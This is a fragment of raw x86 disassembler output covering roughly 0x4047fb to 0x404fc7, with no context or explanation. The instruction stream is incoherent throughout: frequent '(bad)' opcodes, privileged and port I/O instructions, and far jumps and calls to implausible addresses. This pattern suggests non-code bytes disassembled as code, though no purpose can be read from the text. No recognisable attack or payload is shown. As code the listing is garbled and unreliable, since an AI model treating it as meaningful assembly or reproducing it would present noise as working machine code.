  4047fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047fc:	jnp    0x4047a8
  4047fe:	inc    eax
  4047ff:	mov    ch,0xc8
  404801:	sub    ebx,DWORD PTR [ebp-0x2]
  404804:	lock push ebx
  404806:	jo     0x404796
  404808:	xchg   edi,eax
  404809:	int3   
  40480a:	lods   al,BYTE PTR ds:[esi]
  40480b:	push   edx
  40480c:	dec    esi
  40480d:	mov    dh,0x3d
  40480f:	add    ebp,DWORD PTR [esi]
  404811:	pop    esp
  404812:	fwait
  404813:	clc    
  404814:	repz inc ebp
  404816:	add    cl,BYTE PTR [esi+0x4c]
  404819:	push   ds
  40481a:	(bad)  
  40481b:	fmul   QWORD PTR [eax+edi*8-0x320dba75]
  404822:	out    dx,al
  404823:	xor    al,0xe6
  404825:	iret   
  404826:	sub    al,0x3
  404828:	xchg   esi,eax
  404829:	add    ebx,DWORD PTR [ebx]
  40482b:	mov    esp,0x54af62fa
  404830:	jns    0x404847
  404832:	dec    esi
  404833:	aaa    
  404834:	jecxz  0x404852
  404836:	mov    eax,ebp
  404838:	jne    0x404860
  40483a:	mov    ebx,0xfdae80b8
  40483f:	retf   0xfff3
  404842:	and    DWORD PTR [ecx-0x16],eax
  404845:	enter  0xbeaa,0x6b
  404849:	ja     0x40480d
  40484b:	xor    eax,0x5b30f090
  404850:	pop    esi
  404851:	mov    BYTE PTR [esi],cl
  404853:	dec    eax
  404854:	leave  
  404855:	adc    al,0xff
  404857:	push   esp
  404858:	mov    edi,DWORD PTR [ecx]
  40485a:	xor    dl,BYTE PTR [edi+esi*8+0x3e]
  40485e:	bnd jae 0x4048ac
  404861:	jno    0x4047ee
  404863:	fdivp  st(6),st
  404865:	xchg   edx,ebx
  404867:	sbb    eax,0x77d4ff47
  40486c:	pop    es
  40486d:	cdq    
  40486e:	cs and eax,0xf8b02588
  404874:	retf   
  404875:	mov    al,0xf4
  404877:	jmp    0xc4f9f68e
  40487c:	add    dh,cl
  40487e:	cmp    DWORD PTR [ebx-0x2c],edx
  404881:	mov    edi,0x1fcaf043
  404886:	and    BYTE PTR [ebx-0x6d],dh
  404889:	xchg   edi,eax
  40488a:	addr16 xor eax,0x400041a3
  404890:	inc    ebp
  404891:	jg     0x4048f2
  404893:	test   BYTE PTR [esi-0x6b2ef10c],dh
  404899:	in     eax,dx
  40489a:	and    eax,0x5f4e3983
  40489f:	mov    eax,0xca9ccbc0
  4048a4:	jbe    0x404883
  4048a6:	loopne 0x404869
  4048a8:	sub    BYTE PTR [eax+0x62],ah
  4048ab:	add    al,0xc
  4048ad:	call   0x751:0xd3dd683d
  4048b4:	xor    edx,ebp
  4048b6:	mov    ch,0xfb
  4048b8:	add    BYTE PTR [edi+0x0],0x91
  4048bc:	test   DWORD PTR [edi+0x477aa6a7],0x5910e81d
  4048c6:	pop    esp
  4048c7:	out    dx,al
  4048c8:	(bad)  
  4048ca:	(bad)  
  4048cb:	pop    ss
  4048cc:	or     DWORD PTR [edx+0x4ebd88a9],0x14
  4048d3:	push   cs
  4048d4:	into   
  4048d5:	lods   eax,DWORD PTR ds:[esi]
  4048d6:	inc    ebx
  4048d7:	mov    eax,ds:0x51ac8af
  4048dc:	lahf   
  4048dd:	sti    
  4048de:	sti    
  4048df:	fadd   QWORD PTR [eax-0x299f56b5]
  4048e5:	cmp    ebp,DWORD PTR [edx-0x132ded57]
  4048eb:	sbb    al,0xa2
  4048ed:	xchg   ebx,eax
  4048ee:	dec    ebx
  4048ef:	fidiv  WORD PTR [edi-0x17]
  4048f2:	dec    ebx
  4048f3:	mov    eax,es
  4048f5:	cld    
  4048f6:	daa    
  4048f7:	xchg   esi,eax
  4048f8:	jecxz  0x4048f5
  4048fa:	mov    eax,fs
  4048fc:	in     al,dx
  4048fd:	ficom  WORD PTR [eax+0x78]
  404900:	adc    DWORD PTR ds:0x674b54bb,edx
  404906:	jbe    0x4048cc
  404908:	pop    edi
  404909:	inc    ebx
  40490a:	cli    
  40490b:	adc    eax,esi
  40490d:	cld    
  40490e:	push   ecx
  40490f:	or     al,BYTE PTR [edx+0x10bdaa34]
  404915:	and    esp,edi
  404917:	stos   DWORD PTR es:[edi],eax
  404918:	imul   ebp,DWORD PTR [esi-0x52],0x23
  40491c:	mov    ds:0x1cc6e8fb,eax
  404921:	dec    edi
  404922:	cwde   
  404923:	mov    dl,0x42
  404925:	inc    ecx
  404926:	hlt    
  404927:	mov    ebx,0x94378684
  40492c:	mov    WORD PTR [edx+0x4c],?
  40492f:	bound  ebp,QWORD PTR [edx]
  404931:	ds loopne 0x404908
  404934:	hlt    
  404935:	mov    ecx,0xc95a232a
  40493a:	inc    eax
  40493b:	jle    0x404917
  40493d:	hlt    
  40493e:	jnp    0x4048ec
  404940:	jns    0x40490c
  404942:	xchg   esi,eax
  404943:	stos   BYTE PTR es:[edi],al
  404944:	sub    eax,0x7d5b2f9c
  404949:	and    eax,edx
  40494b:	adc    eax,0x3898970d
  404950:	adc    BYTE PTR ds:0xab9174bf,cl
  404956:	push   edx
  404957:	les    ecx,FWORD PTR [edi]
  404959:	clc    
  40495a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495b:	cmp    esp,edx
  40495d:	xchg   ebp,esp
  40495f:	xor    ebp,esp
  404961:	cld    
  404962:	and    ecx,DWORD PTR [ebx]
  404964:	push   edx
  404965:	gs in  eax,dx
  404967:	xor    dl,BYTE PTR [ecx+0x13e79bd7]
  40496d:	pop    esp
  40496e:	dec    esp
  40496f:	or     eax,0x63d35333
  404974:	push   0x3f
  404976:	loope  0x404955
  404978:	and    BYTE PTR [ebx],bh
  40497a:	xor    ch,ch
  40497c:	jno    0x40494b
  40497e:	mov    ebp,0x6f3528a4
  404983:	test   eax,0xaba1e346
  404988:	jle    0x404949
  40498a:	int3   
  40498b:	sbb    bl,ah
  40498d:	fist   DWORD PTR [edi]
  40498f:	pop    ecx
  404990:	push   esp
  404991:	adc    bl,bl
  404993:	jge    0x404a06
  404995:	push   0xffffffd2
  404997:	in     al,dx
  404998:	inc    esp
  404999:	frstor [ecx+0x57]
  40499c:	push   esi
  40499d:	int3   
  40499e:	inc    eax
  40499f:	sub    ebp,DWORD PTR [esi+0x33]
  4049a2:	cmp    bl,al
  4049a4:	jle    0x4049df
  4049a6:	and    ebx,DWORD PTR [ebp-0x59]
  4049a9:	cmc    
  4049aa:	xor    BYTE PTR [esi-0x67ce19b3],ch
  4049b0:	xor    DWORD PTR [ecx],ecx
  4049b2:	imul   ebp,DWORD PTR [ebx+0x2d72bfa8],0xa1b07bb4
  4049bc:	ds add ebx,ecx
  4049bf:	dec    esi
  4049c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049c1:	lahf   
  4049c2:	fcom   QWORD PTR [edi+0x440cf0ac]
  4049c8:	cmp    ecx,esp
  4049ca:	xor    al,bh
  4049cc:	je     0x404a21
  4049ce:	pop    es
  4049cf:	push   ss
  4049d0:	ret    0xb004
  4049d3:	cmp    al,0x78
  4049d5:	jnp    0x404a24
  4049d7:	and    DWORD PTR [edi+ebx*2+0xd],0xffffffbb
  4049dc:	inc    edx
  4049dd:	jmp    0x4049b5
  4049df:	popa   
  4049e0:	sbb    ah,BYTE PTR [edi+0x1e]
  4049e3:	push   eax
  4049e4:	pop    esi
  4049e5:	in     eax,dx
  4049e6:	sbb    esi,DWORD PTR es:[ebx]
  4049e9:	and    bl,dl
  4049eb:	cld    
  4049ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049ed:	inc    ebx
  4049ee:	out    0x87,eax
  4049f0:	ficom  WORD PTR [ebx]
  4049f2:	inc    ecx
  4049f3:	add    al,0xdb
  4049f5:	inc    ecx
  4049f6:	(bad)  
  4049f7:	push   esp
  4049f8:	dec    edx
  4049f9:	xchg   DWORD PTR [ecx-0x6d4a598],edx
  4049ff:	xchg   al,ch
  404a01:	xchg   esi,eax
  404a02:	dec    ebx
  404a03:	clc    
  404a04:	jb     0x4049ec
  404a06:	out    dx,al
  404a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a08:	test   ecx,esi
  404a0a:	mov    ecx,0x5bd4fd94
  404a0f:	push   ebx
  404a10:	mov    eax,0x17861a50
  404a15:	mov    ds:0x4fa43881,eax
  404a1a:	adc    eax,0xafa81856
  404a1f:	jle    0x4049f8
  404a21:	cmp    DWORD PTR [edi],edx
  404a23:	or     DWORD PTR [eax+edx*8],esi
  404a26:	fbstp  TBYTE PTR [ecx]
  404a28:	out    dx,eax
  404a29:	push   cs
  404a2a:	outs   dx,BYTE PTR ds:[esi]
  404a2b:	adc    ebp,eax
  404a2d:	cmp    BYTE PTR [edi],0x35
  404a30:	shr    BYTE PTR [ebx+0x12b6b50b],1
  404a36:	nop
  404a37:	jb     0x404a3f
  404a39:	je     0x404a7a
  404a3b:	xchg   edi,eax
  404a3c:	and    eax,0x24c67d41
  404a41:	mov    ecx,0xe363353f
  404a46:	and    bh,ah
  404a48:	xor    DWORD PTR [ebx],eax
  404a4a:	in     al,dx
  404a4b:	jbe    0x404a20
  404a4d:	add    al,BYTE PTR [ebp-0x5f1a52ce]
  404a53:	mov    ds:0xc33723b7,eax
  404a58:	pop    edx
  404a59:	xor    esi,DWORD PTR [ebp+0x6e550a2f]
  404a5f:	inc    edi
  404a60:	push   edx
  404a61:	fs pop ss
  404a63:	mov    cl,0xf4
  404a65:	or     bl,BYTE PTR [eax]
  404a67:	shl    edx,cl
  404a69:	sub    al,0xfd
  404a6b:	mov    esp,ecx
  404a6d:	jle    0x404a7c
  404a6f:	mov    BYTE PTR [edi],dl
  404a71:	push   edi
  404a72:	sar    DWORD PTR [ecx-0x38],cl
  404a75:	fnstcw WORD PTR ds:0x98e8f2ce
  404a7b:	add    cl,BYTE PTR [edx]
  404a7d:	mov    esp,0x6b810cc4
  404a82:	test   eax,0xd52499f8
  404a87:	adc    al,0x19
  404a89:	push   0xc0891299
  404a8e:	add    eax,0x18053350
  404a93:	xchg   ebx,eax
  404a94:	popa   
  404a95:	sub    DWORD PTR [ebx],ecx
  404a97:	xlat   BYTE PTR ds:[ebx]
  404a98:	arpl   WORD PTR [edx+0x4b131c3e],bx
  404a9e:	inc    eax
  404a9f:	push   esi
  404aa0:	mov    BYTE PTR [ebx+0x62],cl
  404aa3:	mov    ?,WORD PTR [eax+ebp*2]
  404aa6:	js     0x404ab1
  404aa8:	test   al,0x11
  404aaa:	pop    ebx
  404aab:	rcr    BYTE PTR fs:[edi+0x59],cl
  404aaf:	add    al,0x4e
  404ab1:	inc    ecx
  404ab2:	adc    BYTE PTR ds:0xbff1f6c7,cl
  404ab8:	(bad)  
  404ab9:	call   FWORD PTR [ebx+0x69]
  404abc:	imul   edx,DWORD PTR [ebx],0x64a621cc
  404ac2:	mov    ebx,0x811d3e28
  404ac7:	pop    ss
  404ac8:	mov    ebx,0x4aa67fe5
  404acd:	fcom   DWORD PTR [ebx-0x2c151703]
  404ad3:	inc    ecx
  404ad4:	xor    BYTE PTR [edx+edx*4-0x109c197],ah
  404adb:	add    bh,BYTE PTR [edx]
  404add:	sub    DWORD PTR [edx],esi
  404adf:	sub    ch,BYTE PTR [eax-0x33b4910d]
  404ae5:	inc    edx
  404ae6:	add    al,0x10
  404ae8:	imul   edi,DWORD PTR ds:0xfd220890,0x8439c79b
  404af2:	pop    es
  404af3:	jb     0x404ac6
  404af5:	imul   esp,DWORD PTR [edx+0x3e3a38bc],0x16
  404afc:	cwde   
  404afd:	pop    eax
  404afe:	outs   dx,BYTE PTR ds:[esi]
  404aff:	sbb    dl,BYTE PTR [ecx+0xce9073f]
  404b05:	out    0x10,al
  404b07:	add    ecx,DWORD PTR [ecx+0x48]
  404b0a:	mov    edx,0xff580932
  404b0f:	add    ch,cl
  404b11:	and    al,BYTE PTR [edx+0x37cc05ed]
  404b17:	fimul  WORD PTR [edx+0xe]
  404b1a:	adc    BYTE PTR [ecx+0x9261071],al
  404b20:	fsubr  QWORD PTR [edi]
  404b22:	pop    ebp
  404b23:	push   edx
  404b24:	cmc    
  404b25:	enter  0x68f1,0x3f
  404b29:	inc    esi
  404b2a:	outs   dx,DWORD PTR ds:[esi]
  404b2b:	jbe    0x404b0c
  404b2d:	xchg   edi,eax
  404b2e:	fadd   QWORD PTR ds:0x597130df
  404b34:	aam    0x6c
  404b36:	dec    eax
  404b37:	push   ss
  404b38:	ja     0x404b2e
  404b3a:	cld    
  404b3b:	pop    esi
  404b3c:	adc    eax,0xa91577e7
  404b41:	push   eax
  404b42:	mov    cl,0x59
  404b44:	mov    ds:0x49b74c7a,al
  404b49:	pop    edi
  404b4a:	dec    esp
  404b4b:	and    DWORD PTR [eax-0x3c],ebp
  404b4e:	jecxz  0x404b2f
  404b50:	(bad)  
  404b51:	mov    esi,0xe6990d05
  404b56:	push   0x82d33b86
  404b5b:	push   cs
  404b5c:	pop    esp
  404b5d:	ret    
  404b5e:	retf   0x67a5
  404b61:	leave  
  404b62:	or     ebx,DWORD PTR [edi+0x7a08d439]
  404b68:	enter  0xaa62,0xd5
  404b6c:	aas    
  404b6d:	inc    ebp
  404b6e:	pop    ebx
  404b6f:	mov    BYTE PTR [ebp-0x79cc5d1f],ah
  404b75:	adc    DWORD PTR [ebp-0x576b10d9],ebp
  404b7b:	retf   
  404b7c:	jno    0x404b87
  404b7e:	shl    edi,0x76
  404b81:	xchg   BYTE PTR [edi],bh
  404b83:	out    dx,al
  404b84:	xchg   esp,eax
  404b85:	imul   esp,DWORD PTR [esi-0x30],0x9803bee6
  404b8c:	xor    BYTE PTR [edi],al
  404b8e:	aaa    
  404b8f:	fiadd  DWORD PTR [edx+0x75]
  404b92:	aad    0x7c
  404b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b95:	xlat   BYTE PTR ds:[ebx]
  404b96:	(bad)  
  404b97:	scas   eax,DWORD PTR es:[edi]
  404b98:	rcl    eax,cl
  404b9a:	in     eax,dx
  404b9b:	sub    eax,0xf3757bf3
  404ba0:	and    bh,cl
  404ba2:	xchg   edx,eax
  404ba3:	shr    DWORD PTR [ebx-0x22],1
  404ba6:	sbb    dl,BYTE PTR [ebx+0x26]
  404ba9:	(bad)  
  404baa:	xchg   ebx,eax
  404bab:	pop    ecx
  404bac:	aad    0x71
  404bae:	or     al,0xa9
  404bb0:	icebp  
  404bb1:	jl     0x404bec
  404bb3:	lea    ebx,[ebx-0x54]
  404bb6:	repnz add bl,BYTE PTR [esi-0x46]
  404bba:	test   al,0x25
  404bbc:	cdq    
  404bbd:	lods   al,BYTE PTR ds:[esi]
  404bbe:	cmp    esp,DWORD PTR [edx-0x18f0e8c4]
  404bc4:	cdq    
  404bc5:	pop    ebx
  404bc6:	mov    al,ds:0xb4114e28
  404bcb:	call   0x9c77:0xf07e9abc
  404bd2:	aad    0xc0
  404bd4:	mov    ah,BYTE PTR [ecx+0x5a943189]
  404bda:	jle    0x404c43
  404bdc:	inc    edx
  404bdd:	xor    eax,0x18536729
  404be2:	hlt    
  404be3:	inc    edi
  404be4:	cmp    eax,0xebf80a6d
  404be9:	hlt    
  404bea:	pushf  
  404beb:	lock aad 0x2c
  404bee:	js     0x404c04
  404bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf1:	(bad)  
  404bf2:	call   0x3fce492f
  404bf7:	push   0x41c05edf
  404bfc:	repz add esi,DWORD PTR [edx+0x28]
  404c00:	inc    ecx
  404c01:	retf   
  404c02:	aam    0x57
  404c04:	pop    esi
  404c05:	add    al,dh
  404c07:	das    
  404c08:	jae    0x404c86
  404c0a:	xchg   ebx,edi
  404c0c:	scas   eax,DWORD PTR es:[edi]
  404c0d:	and    eax,0x51f5062f
  404c12:	mov    dl,0x8c
  404c14:	popf   
  404c15:	sbb    BYTE PTR [ecx-0x4a],0xd
  404c19:	ds and eax,0x5da86c2e
  404c1f:	or     eax,0x57582e90
  404c24:	lods   al,BYTE PTR ds:[esi]
  404c25:	es adc al,0x20
  404c28:	(bad)  
  404c29:	mov    ch,0x7c
  404c2b:	and    al,0x8f
  404c2d:	adc    DWORD PTR [ecx-0x3c],edx
  404c30:	mov    ds:0xc1e36cad,al
  404c35:	add    eax,0x1362b848
  404c3a:	sub    DWORD PTR [edi-0x10130847],esp
  404c40:	pusha  
  404c41:	sti    
  404c42:	mov    al,ds:0xa416628b
  404c47:	jmp    0x404c84
  404c49:	mov    ds:0x1212a52f,eax
  404c4e:	sub    ch,BYTE PTR [ebp-0x32]
  404c51:	push   cs
  404c52:	push   eax
  404c53:	lods   eax,DWORD PTR ds:[esi]
  404c54:	repz in al,dx
  404c56:	aas    
  404c57:	cmp    ah,BYTE PTR [ebp+0x2c842671]
  404c5d:	jnp    0x404c19
  404c5f:	ret    
  404c60:	or     eax,ecx
  404c62:	inc    edi
  404c63:	mov    ch,0x70
  404c65:	xor    al,0x5a
  404c67:	add    ah,BYTE PTR [ebx]
  404c69:	dec    edx
  404c6a:	mov    edx,DWORD PTR [edx+0x38]
  404c6d:	cmp    eax,0xd3a00904
  404c72:	inc    esi
  404c73:	xchg   esp,eax
  404c74:	(bad)  
  404c76:	out    0x9d,al
  404c78:	or     eax,0xe5831038
  404c7d:	test   BYTE PTR [eax-0x463ee150],cl
  404c83:	fistp  DWORD PTR [eax]
  404c85:	dec    edx
  404c86:	xor    DWORD PTR [eax],esi
  404c88:	aas    
  404c89:	jnp    0x404c3a
  404c8b:	fwait
  404c8c:	mov    ebx,0xbe5071fe
  404c91:	push   ebx
  404c92:	ffreep st(0)
  404c94:	ds pop ds
  404c96:	(bad)  
  404c97:	xor    ebp,DWORD PTR [edi+0x2d6f053c]
  404c9d:	and    DWORD PTR [esi+0x600e96a],ebp
  404ca3:	push   ebx
  404ca4:	out    dx,eax
  404ca5:	fst    QWORD PTR [edx]
  404ca7:	lock mov ebx,0x77462635
  404cad:	(bad)  
  404cae:	cdq    
  404caf:	mov    eax,0x88a6bd3e
  404cb4:	sbb    ecx,edx
  404cb6:	scas   eax,DWORD PTR es:[edi]
  404cb7:	pop    eax
  404cb8:	leave  
  404cb9:	mov    edx,0x74d76f23
  404cbe:	xchg   esi,eax
  404cbf:	cmp    ah,BYTE PTR [edi+0x51b271df]
  404cc5:	loop   0x404c52
  404cc7:	scas   al,BYTE PTR es:[edi]
  404cc8:	int3   
  404cc9:	mov    ds:0xac124cbb,eax
  404cce:	cmp    eax,0x4f8b50ca
  404cd3:	dec    eax
  404cd4:	sub    eax,0xd8fb9eee
  404cd9:	add    esi,0x51b75be7
  404cdf:	fstp   DWORD PTR [ecx]
  404ce1:	mov    BYTE PTR [esi-0x1577d1ce],cl
  404ce7:	iret   
  404ce8:	pop    es
  404ce9:	ret    0x5607
  404cec:	jns    0x404d06
  404cee:	xlat   BYTE PTR ds:[ebx]
  404cef:	scas   al,BYTE PTR es:[edi]
  404cf0:	in     eax,0x11
  404cf2:	je     0x404ca8
  404cf4:	xchg   ebp,eax
  404cf5:	sbb    eax,esi
  404cf7:	sti    
  404cf8:	scas   eax,DWORD PTR es:[edi]
  404cf9:	xchg   bp,ax
  404cfb:	adc    esi,ecx
  404cfd:	or     cl,BYTE PTR ds:0xe5bad9b
  404d03:	test   BYTE PTR [eax+0x55e1ab05],dl
  404d09:	(bad)  
  404d0a:	rcl    cl,0xdd
  404d0d:	out    0xef,eax
  404d0f:	sbb    cl,dl
  404d11:	cmp    eax,0xecdfed4f
  404d16:	in     al,0xf1
  404d18:	imul   edx,ecx,0xffffffde
  404d1b:	ds push es
  404d1d:	iret   
  404d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d1f:	inc    DWORD PTR [esi]
  404d21:	iret   
  404d22:	pop    ss
  404d23:	add    esp,ebp
  404d25:	mov    al,ds:0xc3d3f378
  404d2a:	add    bl,BYTE PTR [ebx-0x7b]
  404d2d:	cld    
  404d2e:	pop    ecx
  404d2f:	inc    edx
  404d30:	dec    ebp
  404d31:	pop    edi
  404d32:	test   DWORD PTR [ecx+0x5b342465],0xcf51a33b
  404d3c:	mov    ebp,0x491704ba
  404d41:	push   esi
  404d42:	jecxz  0x404d15
  404d44:	sbb    esp,DWORD PTR ds:0x87911435
  404d4a:	mov    ds:0x5a616f04,al
  404d4f:	daa    
  404d50:	dec    edx
  404d51:	test   dl,0x98
  404d54:	sbb    eax,0x6a76a92e
  404d59:	jmp    0x5071:0x5ca4f036
  404d60:	cmp    eax,ecx
  404d62:	mov    bh,0x64
  404d64:	jno    0x404d76
  404d66:	mov    dh,0x72
  404d68:	mov    esp,0x9c44b044
  404d6d:	frstor [ecx+0x23]
  404d70:	mov    ch,0x3
  404d72:	jp     0x404cfa
  404d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d75:	aam    0x8f
  404d77:	test   eax,0x3a7bc684
  404d7c:	cmp    al,0xa1
  404d7e:	jle    0x404de1
  404d80:	sbb    al,0x41
  404d82:	outs   dx,DWORD PTR ds:[esi]
  404d83:	int    0x65
  404d85:	mov    ds:0x65b17f1c,eax
  404d8a:	int    0x68
  404d8c:	sub    DWORD PTR [ecx-0x39cb261d],0x15
  404d93:	out    dx,al
  404d94:	xor    al,dh
  404d96:	sub    BYTE PTR [ecx],0xc8
  404d99:	retf   0x89e8
  404d9c:	inc    ecx
  404d9d:	xchg   esp,eax
  404d9e:	cs jl  0x404d97
  404da1:	mov    ebp,0xaab4468f
  404da6:	stos   DWORD PTR es:[edi],eax
  404da7:	pop    edi
  404da8:	pushf  
  404da9:	jge    0x404e23
  404dab:	xchg   ecx,eax
  404dac:	pusha  
  404dad:	mov    cl,0x98
  404daf:	call   0xea65:0x1ebace77
  404db6:	cmp    BYTE PTR ds:[edx+edx*4],ah
  404dba:	adc    al,0x6d
  404dbc:	jg     0x404e35
  404dbe:	imul   edx,DWORD PTR [edx-0x6f161cf3],0xffffffe5
  404dc5:	or     eax,0xe3be2958
  404dca:	fwait
  404dcb:	add    al,0xb1
  404dcd:	sub    al,0x2f
  404dcf:	mov    ah,0x62
  404dd1:	jmp    FWORD PTR [edi+eiz*8-0x32]
  404dd5:	xchg   esp,eax
  404dd6:	jmp    0xc4a6:0x488ed281
  404ddd:	cmp    al,0x39
  404ddf:	loopne 0x404da5
  404de1:	lds    ebx,FWORD PTR [edx+0x45]
  404de4:	mov    ch,0x5d
  404de6:	retfw  
  404de8:	mov    BYTE PTR [edi],al
  404dea:	xor    al,0x49
  404dec:	ins    BYTE PTR es:[edi],dx
  404ded:	(bad)  
  404dee:	ret    0x6969
  404df1:	idiv   BYTE PTR [ecx-0x53]
  404df4:	cwde   
  404df5:	and    al,0x3d
  404df7:	jg     0x404d85
  404df9:	je     0x404e20
  404dfb:	xor    al,0xb9
  404dfd:	out    0xa2,al
  404dff:	mov    ah,0x8c
  404e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e02:	adc    eax,0x3e481be
  404e07:	mov    edi,0x91323173
  404e0c:	push   ss
  404e0d:	xlat   BYTE PTR ds:[ebx]
  404e0e:	test   al,0xe0
  404e10:	test   al,0x80
  404e12:	scas   eax,DWORD PTR es:[edi]
  404e13:	sub    dl,BYTE PTR [ecx]
  404e15:	mov    ecx,0xcfa96117
  404e1a:	ror    WORD PTR [ebx-0x27347ba2],cl
  404e21:	jp     0x404e43
  404e23:	jnp    0x404e7c
  404e25:	lds    ebx,FWORD PTR [ebp+0x43]
  404e28:	pushf  
  404e29:	rdmsr  
  404e2b:	xchg   ebp,eax
  404e2c:	test   al,0x43
  404e2e:	ds push es
  404e30:	into   
  404e31:	inc    ebp
  404e32:	test   al,0x84
  404e34:	mov    dl,0x80
  404e36:	es jnp 0x404e75
  404e39:	test   BYTE PTR [ebx],ch
  404e3b:	jmp    0x404e57
  404e3d:	jne    0x404ea0
  404e3f:	jne    0x404e47
  404e41:	imul   ebp,DWORD PTR [edi+0x28],0xffffffc3
  404e45:	adc    al,0xc5
  404e47:	(bad)  
  404e48:	mov    bl,0x44
  404e4a:	pop    ss
  404e4b:	pusha  
  404e4c:	mov    esi,0xe1f55296
  404e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e52:	xor    BYTE PTR [ebp+esi*4+0x1f13b6e8],bh
  404e59:	mov    eax,ds:0x3e108e2d
  404e5e:	sbb    DWORD PTR [ebp-0x2feee576],ecx
  404e64:	mov    eax,0xfb9882b5
  404e69:	cmp    DWORD PTR [ecx-0x3731c763],eax
  404e6f:	xchg   esi,eax
  404e70:	or     esp,eax
  404e72:	inc    edi
  404e73:	pop    edx
  404e74:	mov    esp,0xcbf22792
  404e79:	jmp    0x404e42
  404e7b:	imul   edi,DWORD PTR [ecx-0x2],0xffa63c61
  404e82:	and    DWORD PTR [ecx],edx
  404e84:	(bad)  
  404e86:	icebp  
  404e87:	int3   
  404e88:	sahf   
  404e89:	je     0x404e22
  404e8b:	or     dl,BYTE PTR [ebx]
  404e8d:	jo     0x404e7e
  404e8f:	adc    edx,DWORD PTR [ebp+edi*8-0x6c]
  404e93:	rcr    DWORD PTR [ebp+0x35ffc0f9],1
  404e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9a:	push   ebx
  404e9b:	pop    esi
  404e9c:	xor    al,0x2d
  404e9e:	pop    eax
  404e9f:	sbb    esi,eax
  404ea1:	fnstsw WORD PTR [ebx+0x182caaa7]
  404ea7:	clc    
  404ea8:	out    0x60,al
  404eaa:	les    eax,FWORD PTR [edx+0x30]
  404ead:	inc    ebx
  404eae:	imul   ebx,DWORD PTR [eax],0x155d698f
  404eb4:	jecxz  0x404eb3
  404eb6:	xor    DWORD PTR [ebp+0x6f4323db],0xffffffce
  404ebd:	mov    al,ds:0x380e5dd9
  404ec2:	jne    0x404f17
  404ec4:	or     edx,edx
  404ec6:	lods   eax,DWORD PTR ds:[esi]
  404ec7:	xor    bh,ah
  404ec9:	imul   esp,edx,0xd2037576
  404ecf:	jmp    0xd204:0xe7739bb4
  404ed6:	(bad)  
  404ed7:	dec    ecx
  404ed8:	scas   al,BYTE PTR es:[edi]
  404ed9:	push   0x4229d673
  404ede:	adc    ebp,DWORD PTR [eax+ebp*4]
  404ee1:	ds aad 0x85
  404ee4:	cs jg  0x404e6c
  404ee7:	sbb    esp,DWORD PTR [esi]
  404ee9:	stos   DWORD PTR es:[edi],eax
  404eea:	repz cmp dl,al
  404eed:	fdivr  DWORD PTR [ebx-0x38213048]
  404ef3:	add    edx,edx
  404ef5:	out    dx,al
  404ef6:	mov    eax,0x8404e815
  404efb:	std    
  404efc:	xchg   BYTE PTR [ecx],al
  404efe:	mov    esp,0x6a8f01ac
  404f03:	ins    DWORD PTR es:[edi],dx
  404f04:	(bad)  
  404f05:	sar    dl,cl
  404f07:	jecxz  0x404f68
  404f09:	mov    ebp,0x1f3d0608
  404f0e:	pop    edx
  404f0f:	ds jo  0x404f7f
  404f12:	lds    esi,FWORD PTR [eax-0x39]
  404f15:	inc    ebx
  404f16:	xchg   ecx,eax
  404f17:	jb     0x404f1b
  404f19:	mov    WORD PTR [eax+eax*4+0x3f07d2a5],?
  404f20:	rol    DWORD PTR [edi],cl
  404f22:	mov    ds:0x963db815,al
  404f27:	neg    BYTE PTR [ebp+0x72]
  404f2a:	leave  
  404f2b:	xchg   esp,eax
  404f2c:	dec    ebx
  404f2d:	cs mov ah,0xcd
  404f30:	(bad)  
  404f31:	call   0x7eb6ac13
  404f36:	mov    ebx,0x491365c1
  404f3b:	popf   
  404f3c:	xor    al,0x8
  404f3e:	enter  0x6a35,0xd
  404f42:	cmp    ah,BYTE PTR [ecx+0x5e]
  404f45:	adc    edi,DWORD PTR [edx+0x21]
  404f48:	push   cs
  404f49:	sub    edx,DWORD PTR [edx-0x753bccd4]
  404f4f:	cmc    
  404f50:	push   es
  404f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f52:	cs aam 0x9d
  404f55:	jbe    0x404f08
  404f57:	popf   
  404f58:	jecxz  0x404f5a
  404f5a:	jl     0x404f7d
  404f5c:	or     DWORD PTR [ebp-0x3920ea06],esi
  404f62:	mov    eax,0x11542fcf
  404f67:	push   cs
  404f68:	add    al,0xbb
  404f6a:	fstp   TBYTE PTR [edx-0x1e]
  404f6d:	sbb    eax,0x59ea86b1
  404f72:	xchg   edi,eax
  404f73:	lds    ebp,FWORD PTR [eax+0x6b98a57e]
  404f79:	dec    ebx
  404f7a:	cs mov eax,esp
  404f7d:	push   eax
  404f7e:	out    dx,al
  404f7f:	int3   
  404f80:	inc    esp
  404f81:	adc    eax,0xb45e5759
  404f86:	push   es
  404f87:	adc    al,0x42
  404f89:	xchg   ecx,eax
  404f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f8b:	sbb    BYTE PTR [edi-0x50],ch
  404f8e:	sti    
  404f8f:	jno    0x405010
  404f91:	cdq    
  404f92:	push   cs
  404f93:	jno    0x404f75
  404f95:	add    eax,0xdcee8bdd
  404f9a:	add    DWORD PTR [edx+0x61],esp
  404f9d:	jmp    0x9ac5:0x53c63541
  404fa4:	mov    dl,0x1d
  404fa6:	push   edi
  404fa7:	ins    DWORD PTR es:[edi],dx
  404fa8:	xor    al,0xb4
  404faa:	fcom   DWORD PTR [ebp+0x9daf9be]
  404fb0:	inc    esi
  404fb1:	jo     0x405007
  404fb3:	int    0xd8
  404fb5:	add    dl,ah
  404fb7:	(bad)  
  404fb8:	loopne 0x404fe1
  404fba:	inc    ecx
  404fbb:	repz (bad) 
  404fbd:	mul    ebp
  404fbf:	sub    ah,BYTE PTR [eax-0x52d14616]
  404fc5:	iret   
  404fc6:	lahf   
  404fc7:	mov    ebx,DWORD PTR [esi-0x42]
